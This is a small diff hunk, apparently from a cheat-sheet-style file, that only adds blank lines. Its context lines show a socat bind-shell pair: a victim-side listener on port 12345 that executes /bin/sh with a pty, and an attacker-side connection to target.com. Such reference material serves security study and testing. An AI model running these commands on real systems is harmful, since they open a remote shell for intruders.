@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:21:16.981833+00:00'
 user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
 user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
 ```
+
+
